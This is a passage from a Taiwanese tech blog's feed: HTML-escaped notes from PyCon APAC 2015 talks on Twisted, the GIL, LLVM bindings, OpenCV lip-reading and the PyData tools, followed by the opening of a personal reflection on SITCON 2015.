&lt;li&gt;Support ~ 100 online players per CPU  &lt;ul&gt;
&lt;li&gt;Scaling by adding cores  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What is Twisted?  &lt;ul&gt;
&lt;li&gt;Network library  &lt;/li&gt;
&lt;li&gt;Asynchronous event loop, like NGINX  &lt;/li&gt;
&lt;li&gt;Supports many internet protocols  &lt;ul&gt;
&lt;li&gt;HTTP  &lt;/li&gt;
&lt;li&gt;SSH  &lt;/li&gt;
&lt;li&gt;FTP  &lt;/li&gt;
&lt;li&gt;SMTP  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Consistent Python API, not every easy but really consistent  &lt;/li&gt;
&lt;li&gt;Easy to extend with custom classes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Asynchronous server  &lt;/li&gt;
&lt;li&gt;use both synchronous and asynchronous code  &lt;ul&gt;
&lt;li&gt;not every computation are suitable with asynchronous  &lt;/li&gt;
&lt;li&gt;synchronous code is easier to write  &lt;/li&gt;
&lt;li&gt;synchronous (99%)  &lt;ul&gt;
&lt;li&gt;fast: 1 - 100 ms  &lt;ul&gt;
&lt;li&gt;attack  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;asynchronous (1%)  &lt;ul&gt;
&lt;li&gt;slow: 100ms - 10 seconds  &lt;ul&gt;
&lt;li&gt;Reading/writing Amazon S3 on login/logout  &lt;/li&gt;
&lt;li&gt;Quering Facebook API  &lt;/li&gt;
&lt;li&gt;Top scores database query  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Write an asynchronous http server by using Twisted  &lt;ul&gt;
&lt;li&gt;reactor  &lt;/li&gt;
&lt;li&gt;twisted.web.NOT_DONE_YET  &lt;/li&gt;
&lt;li&gt;request.write("Hello")  &lt;/li&gt;
&lt;li&gt;request.finish()  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to connect "before" and "after"  &lt;/li&gt;
&lt;li&gt;inlineCallbacks (decorator) in Twisted  &lt;/li&gt;
&lt;li&gt;Collect data on each request  &lt;ul&gt;
&lt;li&gt;Average latency (performance hotspot)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Watch total "unhalted" time  &lt;ul&gt;
&lt;li&gt;What % of the time the CPU is waiting for the next request?  &lt;/li&gt;
&lt;li&gt;50% = danger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Day 2- 2015/06/06 - Sat&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://hackpad.com/PyCon-APAC-2015-Day-2-June-6-gLUoM6krKOq"&gt;PyCon APAC 2015 - Day 2 (June 6) - hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;GIL - Tzung-Bi Shih&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://github.com/penvirus/gil1"&gt;https://github.com/penvirus/gil1&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Introduction  &lt;ul&gt;
&lt;li&gt;Global Interpreter Lock  &lt;ul&gt;
&lt;li&gt;Giant Lock  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL in CPython protects  &lt;ul&gt;
&lt;li&gt;Interpreter state, thread state, ...  &lt;/li&gt;
&lt;li&gt;reference count  &lt;/li&gt;
&lt;li&gt;"a Guarantee"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Other implementations  &lt;ul&gt;
&lt;li&gt;fine-grained Lock  &lt;ul&gt;
&lt;li&gt;把 lock 切小  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;lock-free  &lt;ul&gt;
&lt;li&gt;不需要 Lock - 兩種  &lt;ul&gt;
&lt;li&gt;algorithm  &lt;/li&gt;
&lt;li&gt;底層操作達到 atomic  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;把 lock offload 到下一層  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL 好做  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL over multi-processor  &lt;ul&gt;
&lt;li&gt;Want to produce efficient program.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL 該不該存在，需不需要拿掉?  &lt;ul&gt;
&lt;li&gt;問題  &lt;ul&gt;
&lt;li&gt;有太多 legacy 的東西要處理  &lt;/li&gt;
&lt;li&gt;「男子漢的約定不能改變！」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Brainless Solution for multi-process  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Embarrassingly parallel  &lt;ul&gt;
&lt;li&gt;no dependency between those parallel tasks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IPC-required parallel tasks  &lt;ul&gt;
&lt;li&gt;share states with other peers  &lt;/li&gt;
&lt;li&gt;the most costly overhead of the GIL battle  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;multiprocessing  &lt;ul&gt;
&lt;li&gt;process pool  &lt;/li&gt;
&lt;li&gt;nondeterministic  &lt;ul&gt;
&lt;li&gt;the same input, different output.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;further observations  &lt;ul&gt;
&lt;li&gt;workers are forked when initializing the pool, they share the same memory copy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;pp (parallel python) remote node  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ppserver.py -v 1 -p 10000 &amp;amp;&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Release the GIL  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Examples  &lt;ul&gt;
&lt;li&gt;ctypes  &lt;ul&gt;
&lt;li&gt;thread for GIL battle  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python / C extension  &lt;ul&gt;
&lt;li&gt;linking to the busy.so extension  &lt;/li&gt;
&lt;li&gt;When it comes to C thread vs Python thread battle, C thread always win.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cooperative Multitasking  &lt;ul&gt;
&lt;li&gt;Only applicable to IO-bound tasks  &lt;/li&gt;
&lt;li&gt;Single process, single Threads  &lt;ul&gt;
&lt;li&gt;no other thread, no GIL battle  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Executing the code when exactly needed  &lt;/li&gt;
&lt;li&gt;Examples:  &lt;ul&gt;
&lt;li&gt;generator (太 geek，容易寫錯)  &lt;/li&gt;
&lt;li&gt;pyev (recommended)  &lt;ul&gt;
&lt;li&gt;link to libe  &lt;/li&gt;
&lt;li&gt;實際上會使用 io watcher  &lt;/li&gt;
&lt;li&gt;further observations  &lt;ul&gt;
&lt;li&gt;不用任何 symbol 去接、重複使用同一個 symbol 都會造成 segmentation fault  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;gevent (recommended)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Interpreter as an Instance (rough idea)  &lt;ul&gt;
&lt;li&gt;C program, singel process, multi-thread  &lt;ul&gt;
&lt;li&gt;still can share states with relatively low penalty  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Allocate memory space for interpreter context  &lt;ul&gt;
&lt;li&gt;that is, accept an address to put instance context in Py_Initialize()  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Conclusion  &lt;ul&gt;
&lt;li&gt;How to live along with GIL well?  &lt;ul&gt;
&lt;li&gt;Multi-process  &lt;/li&gt;
&lt;li&gt;Release the GIL  &lt;/li&gt;
&lt;li&gt;Cooperative Multitasking  &lt;ul&gt;
&lt;li&gt;for IO-bound solution  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Perhaps, Interpreter as an Instance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Python &amp;amp; LLVM - 李楓&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;llvmpy  &lt;ul&gt;
&lt;li&gt;urls  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.llvmpy.org"&gt;http://www.llvmpy.org&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/llvmpy/llvmpy"&gt;https://github.com/llvmpy/llvmpy&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;llvm.core  &lt;/li&gt;
&lt;li&gt;Pros  &lt;ul&gt;
&lt;li&gt;Support Python 3.x  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons  &lt;ul&gt;
&lt;li&gt;only support to LLVM 3.3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;llvmlite  &lt;ul&gt;
&lt;li&gt;urls  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/numba/llvmlite"&gt;https://github.com/numba/llvmlite&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://llvmlite.pydata.org/"&gt;http://llvmlite.pydata.org/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A lightweight LLVM python Binding for writing JIT compilers  &lt;/li&gt;
&lt;li&gt;架構比 llvmpy 簡潔  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HPC  &lt;ul&gt;
&lt;li&gt;Heterogeneous Parallel Computing  &lt;/li&gt;
&lt;li&gt;High Performance Computing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Anaconda  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://continuum.io/downloads"&gt;http://continuum.io/downloads&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://store.continuum.io/cshop/anaconda/"&gt;https://store.continuum.io/cshop/anaconda/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Black Scholes example  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Debugging  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://lldb.llvm.org"&gt;LLDB&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Debuger for LLVM  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://lldb.llvm.org/build.html"&gt;http://lldb.llvm.org/build.html&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;使用 CMake + Ninja  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/upbit/lldb-capstone-arm"&gt;LLDB-Capstone&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;LLVM's Machine Code (MC) layer  &lt;/li&gt;
&lt;li&gt;Python Binding  &lt;ul&gt;
&lt;li&gt;support Python 2 &amp;amp; 3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wisk/medusa"&gt;Medusa&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Python 讓你的眼睛看得見 - Yu-Chi Lin&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;McGurk 效應  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.wikipedia.org/wiki/錯聽"&gt;錯聽 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;資料從哪來  &lt;ul&gt;
&lt;li&gt;英文語料庫：AVleter, CUAVE, OuluVS, IBMSR, IBMIH  &lt;/li&gt;
&lt;li&gt;中文語料庫：找不到，所以資料庫自己建  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自己建資料庫  &lt;ul&gt;
&lt;li&gt;透過安排好的語料，隨機讓受試者唸出，並錄影錄音。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OpenCV  &lt;/li&gt;
&lt;li&gt;研究架構  &lt;ul&gt;
&lt;li&gt;臉部偵測 =&amp;gt; 嘴巴偵測 =&amp;gt; 相鄰 frame 的變化量計算，切出音節  &lt;/li&gt;
&lt;li&gt;聲音訊號分析 =&amp;gt; 以波形能量切音節  &lt;/li&gt;
&lt;li&gt;結合以上兩個，以聲音為主，影像為輔，切出正確音節  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;偵測  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://alereimondo.no-ip.org/OpenCV/34"&gt;Haar feature&lt;/a&gt;, Adaboost  &lt;/li&gt;
&lt;li&gt;The haar cascade for mouth  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果你要訓練一個自己的分類器?  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://coding-robin.de/2013/07/22/train-your-own-opencv-haar-classifier.html"&gt;train your own opencv haar classifier&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mrnugget/opencv-haar-classifier-training"&gt;https://github.com/mrnugget/opencv-haar-classifier-training&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;怎麼判斷電腦切音節切得好不好？=&amp;gt; 還是得靠人力來判斷  &lt;ul&gt;
&lt;li&gt;聲音切音節 + 人力切音節 =&amp;gt; 得到最接近正確音節的位置  &lt;/li&gt;
&lt;li&gt;其他切音節的方法  &lt;ul&gt;
&lt;li&gt;以嘴巴開合的面積大小來計算  &lt;ul&gt;
&lt;li&gt;以顏色判別嘴唇或皮膚，以此計算開合大小  &lt;/li&gt;
&lt;li&gt;HSV colorspace  &lt;/li&gt;
&lt;li&gt;框出嘴唇的外輪廓，計算面積大小  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OpenCV in Machine Learning  &lt;ul&gt;
&lt;li&gt;scikit-learn  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;以雲端語音合成技術為基礎的音文同步有聲書之建立系統 - Chao-Ka Chang&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;google TTS  &lt;/li&gt;
&lt;li&gt;Python MTK  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;龜作圖&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3.5/library/turtle.html"&gt;https://docs.python.org/3.5/library/turtle.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Turtle_graphics"&gt;http://en.wikipedia.org/wiki/Turtle_graphics&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;LT&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;網頁爬蟲  &lt;ul&gt;
&lt;li&gt;urllib2  &lt;/li&gt;
&lt;li&gt;pycurl  &lt;/li&gt;
&lt;li&gt;selenium  &lt;/li&gt;
&lt;li&gt;virtkey, pytesser  &lt;/li&gt;
&lt;li&gt;use thread  &lt;/li&gt;
&lt;li&gt;被 ban  &lt;ul&gt;
&lt;li&gt;睡覺皇帝大, sleep  &lt;/li&gt;
&lt;li&gt;proxy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Day3 - 2015/06/07 - Sun&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://hackpad.com/PyCon-APAC-2015-Day-3-June-7-KkH9iGy5gFb"&gt;PyCon APAC 2015 - Day 3 (June 7) - hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;- Andy Terrel&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;The Fundamental Physics  &lt;ul&gt;
&lt;li&gt;Moving / Copying data is more expensive than computation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Business Data Processing  &lt;/li&gt;
&lt;li&gt;Scientific Data Processing  &lt;/li&gt;
&lt;li&gt;"Data Has Mass"  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://datagravity.org/2012/06/26/a-formula-for-data-gravity/"&gt;Data Gravity&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Memory Matters  &lt;ul&gt;
&lt;li&gt;1980s  &lt;/li&gt;
&lt;li&gt;90s - 00s  &lt;ul&gt;
&lt;li&gt;L1, L2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2010s  &lt;ul&gt;
&lt;li&gt;L3  &lt;/li&gt;
&lt;li&gt;SSD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Speed Matters  &lt;/li&gt;
&lt;li&gt;"Data Scientist" Dilemma  &lt;ul&gt;
&lt;li&gt;Massive data to deal with (must bring code to data)  &lt;/li&gt;
&lt;li&gt;Cacophony of tools, data-bases, and products to integrate  &lt;/li&gt;
&lt;li&gt;Modern hardware tempts to be used but mostly idel (GPUs, data0center clusters)  &lt;/li&gt;
&lt;li&gt;Huge  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Python --- Spectrum  &lt;ul&gt;
&lt;li&gt;Occasional  &lt;ul&gt;
&lt;li&gt;Cut and Paste  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scientist Developer  &lt;ul&gt;
&lt;li&gt;Extend frameworks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Developer  &lt;ul&gt;
&lt;li&gt;Create frameworks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unique aspect of Python  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Architecting for Data  &lt;ul&gt;
&lt;li&gt;Data exploration as the central task.  &lt;/li&gt;
&lt;li&gt;Data visualization as a first-  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Building Exploratory Data Platforms  &lt;ul&gt;
&lt;li&gt;Environments  &lt;ul&gt;
&lt;li&gt;Wakari  &lt;/li&gt;
&lt;li&gt;Anaconda  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Analytics  &lt;ul&gt;
&lt;li&gt;Blaze  &lt;/li&gt;
&lt;li&gt;Numba  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Visualization  &lt;ul&gt;
&lt;li&gt;Bokeh  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Our Position  &lt;ul&gt;
&lt;li&gt;No one-size-fits-all pint-and-click application is enough to solve business problems.  &lt;/li&gt;
&lt;li&gt;A language-based platform is needed. ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Science Discovery Process  &lt;ul&gt;
&lt;li&gt;Data Acquistition - Blaze  &lt;/li&gt;
&lt;li&gt;Data Preparation - Anaconda server  &lt;/li&gt;
&lt;li&gt;Data Analysis - IPython Notebook  &lt;/li&gt;
&lt;li&gt;Data Interpretation - Bokeh  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Important Pieces of the Platform  &lt;ul&gt;
&lt;li&gt;Anaconda - easy to install, plus lots of libraries  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Building a better PyData Ecosystem  &lt;/li&gt;
&lt;li&gt;Open SOurce Technology  &lt;ul&gt;
&lt;li&gt;Blaze  &lt;ul&gt;
&lt;li&gt;Array URLs and compute servers for breaking down data-silos.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bokeh  &lt;ul&gt;
&lt;li&gt;Interactive Visualization in the Browser for Python (and other languages) of large data.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Numba  &lt;ul&gt;
&lt;li&gt;Optimizaing Compiler for subset of Python which allows multi-core, multi-process and basic CPU support  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Pain  &lt;ul&gt;
&lt;li&gt;Dealing with data applications has numerous pain points  &lt;/li&gt;
&lt;li&gt;Hundreds of data formats  &lt;/li&gt;
&lt;li&gt;Basic programs expect all data to fit in memory  &lt;/li&gt;
&lt;li&gt;Data analysis pipelines constantly changin from one form to another  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Blaze  &lt;ul&gt;
&lt;li&gt;NEED, TOOL, CAPABILITY  &lt;/li&gt;
&lt;li&gt;Compisition  &lt;ul&gt;
&lt;li&gt;Distributed Systems  &lt;ul&gt;
&lt;li&gt;spark  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scientific Computing  &lt;ul&gt;
&lt;li&gt;HDFS  &lt;/li&gt;
&lt;li&gt;bcolz  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BI - DB  &lt;ul&gt;
&lt;li&gt;mongo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DM/Stats/ML  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Abstract experssions, Data Storage, Computational Backend  &lt;/li&gt;
&lt;li&gt;Architecture  &lt;ul&gt;
&lt;li&gt;Flexible  &lt;/li&gt;
&lt;li&gt;Use compilation of deferred expressions to optimize data interactions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dask  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://dask.pydata.org"&gt;http://dask.pydata.org&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;DAG - TASKS  &lt;ul&gt;
&lt;li&gt;Collections, Task Graph, Schedulers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ODO  &lt;ul&gt;
&lt;li&gt;Shapeshifting for your data  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;odo(source, target)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Numba  &lt;ul&gt;
&lt;li&gt;JIT, Dynamic compiler for Python  &lt;/li&gt;
&lt;li&gt;Optimize data-parallel computations at call time, to take advantage of local hardware configuration  &lt;/li&gt;
&lt;li&gt;Compatible with C, C++, Fortran  &lt;/li&gt;
&lt;li&gt;C++, C, Fortran, Python =&amp;gt; LLVM IR =&amp;gt; x86, ARM, PTX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Visualization  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://bokeh.pydata.org/en/latest/"&gt;Bokeh&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/bokeh/bokeh"&gt;https://github.com/bokeh/bokeh&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Interactive  &lt;/li&gt;
&lt;li&gt;Novel graphics  &lt;/li&gt;
&lt;li&gt;Streaming, dynamic, large data  &lt;/li&gt;
&lt;li&gt;For the browser, with or without a server  &lt;/li&gt;
&lt;li&gt;Matplotlib compatibility  &lt;/li&gt;
&lt;li&gt;No need to write Jade  &lt;/li&gt;
&lt;li&gt;No JavaScript  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Machine learning in Finance using Python - Eric Tham&lt;/h4&gt;
&lt;p&gt;&lt;a href="http://www.slideshare.net/erictham/machine-learning-in-finance-using-python"&gt;http://www.slideshare.net/erictham/machine-learning-in-finance-using-python&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Introduction  &lt;ul&gt;
&lt;li&gt;Pattern recognition, algorithm, data, prediction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What is machine Learning  &lt;/li&gt;
&lt;li&gt;Machine in Finance  &lt;ul&gt;
&lt;li&gt;Sentiment Analysis (Behavoiural finance)  &lt;/li&gt;
&lt;li&gt;Credit analytics  &lt;/li&gt;
&lt;li&gt;Financial forecasting  &lt;ul&gt;
&lt;li&gt;Technical transformation on Data  &lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Portfolio allocation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Conf"></category><category term="Python"></category><category term="PyCon"></category><category term="PyConAPAC"></category><category term="Thought"></category></entry><entry><title>SITCON 2015 - Android Repackaged App Detection System</title><link href="https://blog.m157q.tw/posts/2015/03/11/sitcon-2015-android-repackaged-app-detection-system/" rel="alternate"></link><published>2015-03-12T00:05:27+08:00</published><updated>2015-03-12T00:05:27+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-11:posts/2015/03/11/sitcon-2015-android-repackaged-app-detection-system/</id><summary type="html">&lt;p&gt;先說說關於今年 SITCON 的感想好了&lt;br /&gt;
關於 Talk 的部分可能會敘述比較長XD  &lt;/p&gt;
&lt;h2&gt;關於 SITCON 2015&lt;/h2&gt;
&lt;p&gt;今年我除了聽最前面兩場由梁伯嵩及 Kaede 主講的 keynote 以外&lt;br /&gt;
其他都沒有聽 因為都在做簡報 XDrz  這種趕死線的壞習慣真的該改...&lt;br /&gt;
（但不知道為啥每次靈感都會在死線前有如泉湧）  &lt;/p&gt;
&lt;p&gt;能夠見到看到 CCCA 創社社長梁伯嵩先生的演講真的很感動&lt;br /&gt;
從網路的起始開始講起&lt;br /&gt;
再提到當時 CCCA 在交大做的那些開路先鋒的事&lt;br /&gt;
至今在社辦都還找得到當年的文件、書籍及辦活動留下來的物品&lt;br /&gt;
雖然現在待的這個社團或許在歷史上有些紛紛擾擾&lt;br /&gt;
但我仍認為這個社團的前身就是 CCCA&lt;br /&gt;
以過去那些 CCCA 的前輩為榜樣&lt;br /&gt;
參加 Conf 真的是讓自己疲憊的身心再次注入熱血的動力  &lt;/p&gt;
&lt;p&gt;Kaede 介紹的廣義的駭客&lt;br /&gt;
現場有些學生可能無法接受&lt;br /&gt;
但看過許多駭客文化的介紹或許就比較能夠了解&lt;br /&gt;
Hacker 是無論哪個領域都有的&lt;br /&gt;
只要你非常專注于該領域 然後闖出了一番傑出的表現 甚至是造福這個世界&lt;br /&gt;
都可以被稱作為 Hacker  這是個尊稱 而不是被現今媒體抹滅的污名  &lt;/p&gt;
&lt;p&gt;今年最猛的大概就是在 R0 的超華麗的導播設備了&lt;br /&gt;
據說是跟金馬獎用的同一套&lt;br /&gt;
還有在 R0 比較後面的區域加掛了螢幕&lt;br /&gt;
讓後面的人也能清楚看見台上的人的演說神情&lt;br /&gt;
真的很過癮&lt;br /&gt;
感謝辛苦的工作人員們 帶給我這麼一場精彩的會議  &lt;/p&gt;
&lt;p&gt;剩下的時間真的都是在趕簡報&lt;br /&gt;
順便跟剛好遇到的 jserv 聊天&lt;br /&gt;
真的很佩服 jserv 的犧牲奉獻精神&lt;br /&gt;
在聊天的過程中也感受到自己的某些觀念還不夠成熟&lt;br /&gt;
跟資工相關的許多觀念也還唸的不夠透徹&lt;br /&gt;
意識到自己只是一味的喜歡 coding&lt;br /&gt;
卻忽略了 Algorithm, Data Structure, Operating System, Computer Organization, Assembly 等等&lt;br /&gt;
那些課本上的知識&lt;br /&gt;
或許是因為當時被迫考試的關係 才感到厭惡&lt;br /&gt;
